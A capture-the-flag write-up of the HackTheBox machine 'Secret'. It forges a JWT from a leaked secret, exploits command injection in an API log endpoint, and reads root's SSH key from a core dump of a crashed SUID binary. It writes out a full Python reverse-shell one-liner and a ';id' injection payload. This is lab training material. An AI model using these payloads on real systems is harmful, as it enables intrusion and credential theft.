# HackTheBox-Secret

## NMAP

```bash
PORT     STATE SERVICE REASON         VERSION       
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)                                                  
80/tcp   open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
| http-methods:                                                           
|_  Supported Methods: GET HEAD POST OPTIONS                              
|_http-server-header: nginx/1.18.0 (Ubuntu)                               
|_http-title: DUMB Docs                                                   
3000/tcp open  http    syn-ack ttl 63 Node.js (Express middleware)
| http-methods:                                                           
|_  Supported Methods: GET HEAD POST OPTIONS                              
|_http-title: DUMB Docs            
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel         

```

## PORT 80/3000 (HTTP)
On both http ports we can see a similar page of `DUMB Docs`

<img src="https://i.imgur.com/qtXFLw7.png"/>

We can navigate to sections which tells us that it's an API based authentication system where it shows the procedure on how to register a user using `POST`requests

<img src="https://i.imgur.com/q9OgeI4.png"/>

Running `gobuster` we can see some files in `/api` directory

<img src="https://i.imgur.com/5Bgz8FF.png"/>

We can download the zip archive from here

<img src="https://i.imgur.com/WPKSBv8.png"/>

And this archive contains a git repository so we can check for commits using `git log`

<img src="https://i.imgur.com/z3U8Q7c.png"/>

This commit has a JWT secret here so to look into this commit we can use the command `git show 67d8da7a0e53d8fadeb6b36396d86cdcd4f6ec78`

<img src="https://i.imgur.com/UORbhcN.png"/>

Let's first try to register a user , now I tried using `burpsuite` and the issue was that when I was sending the POST request in order to register a user , it wasn't working 

<img src="https://i.imgur.com/cqi1OHk.png"/>

Instead I installed `Postman` which is used for testing api calls 

<img src="https://i.imgur.com/mxUBqtB.png"/>

With this I was able to make a POST request to register a user as this returned as the username which means that we were successful in creating a user. We can login by making a POST request with email and password which in return will give us a JWT token

<img src="https://i.imgur.com/zoshyqq.png"/>

From the docs it says if we make a GET request to `/api/priv` it will show us our privileges.

<img src="https://i.imgur.com/IAG9UPl.png"/>

We can become the admin user since we already have found the JWT secret to modify the token but we need to see what username we need to set in order to become admin ,

<img src="https://i.imgur.com/6RMHU4i.png"/>

In `local=web/routes/private.js` we can see that it's checking for username `theadmin` and if that exists in the token that we can become the admin user

So modifiy the token we have and change the username from `arz101` to `theadmin` also add the JWT secret to verify the token

<img src="https://i.imgur.com/UrOvswo.png"/>

<img src="https://i.imgur.com/GS85HrR.png"/>

## Foothold

We can see another endponit `/api/logs`

<img src="https://i.imgur.com/rNKE4wr.png"/>

Which is going to make a `GET` request by taking a parameter named `file` and it's going to execute `git` command 

<img src="https://i.imgur.com/QRB1xb7.png"/>

So let's try to give the parameter 

<img src="https://i.imgur.com/IjowOwM.png"/>

So let's to try to break the command by `;id` and it see if we get command exection

<img src="https://i.imgur.com/fvtUeDV.png"/>

Perfect , now let's get the reverse shell from here

```bash
python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.29",2222));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
```

<img src="https://i.imgur.com/WOrHGfo.png"/>

Stabilizing the shell with python3

<img src="https://i.imgur.com/hILiH06.png"/>

Let's check `sudo -l` if we can run something as the root user without any password

<img src="https://i.imgur.com/HwcvEME.png"/>

We can't so let's see if there's anything running locally

<img src="https://i.imgur.com/i57whfF.png"/>

Only port 27017 is interesting , on which mongodb is running, I checked for suid binaries if there were other than the normal ones and found `/opt/count` had a SUID bit on it 

<img src="https://i.imgur.com/4dYfESl.png"/>

So I ran this binary and what it doee is asks for a file name with the path and lists the total number of characters ,words and lines

<img src="https://i.imgur.com/ECAO0K1.png"/>

We can also the source code for this binary which is in `/opt/code.c`

<img src="https://i.imgur.com/gSqh1P3.png"/>

## Privilege Escalation

Now we can't overflow the binary , reason is that the array `path` is of 100 characters but the way it's storing a value is through `scanf(%99s)` which means that it's going to store 99 chracters plus a null byte which prevents the bufferoverflow

<img src="https://i.imgur.com/b10EDI7.png"/>

<img src="https://i.imgur.com/7x3BzIx.png"/>

But we see this `prctl(PR_SET_DUMPABLE, 1)` , which enables process to be dumped 

<img src="https://i.imgur.com/AHLnVnM.png"/>

In order to dump the process we need to crash the program and the way we can crash it is to forcefully kill the process id and do that we need to have 2 shells , first will run the binary till the point you give the path for the file and second will kill the process for that binary. I used `-6` which is SIGABRT as I tried with `9` (SIGKILL) it wasn't showing the crash report in /var/crash and what I think is that because -9 would stop the execution of the binary whereas -6 will abort execution of binary.

<img src="https://i.imgur.com/aTPJGk5.png"/>

We get the crash report file from `/var/crash`

<img src="https://i.imgur.com/JOWpdYc.png"/>

To read the `CoreDump` file we need to use `apport-unpack` 

<img src="https://i.imgur.com/9oBW0Yn.png"/>

<img src="https://i.imgur.com/rDfiLNn.png"/>

Then just directly read the `CoreDump` file to get root's ssh key

<img src="https://i.imgur.com/gm7z3qW.png"/>

<img src="https://i.imgur.com/W61j9cJ.png"/>

## References

- https://jwt.io/
- https://stackoverflow.com/questions/7732983/core-dump-file-is-not-generated
- https://askubuntu.com/questions/434431/how-can-i-read-a-crash-file-from-var-crash
- https://stackoverflow.com/questions/44670035/how-to-clone-99s-in-fscanffile-d-99s-id-name-2
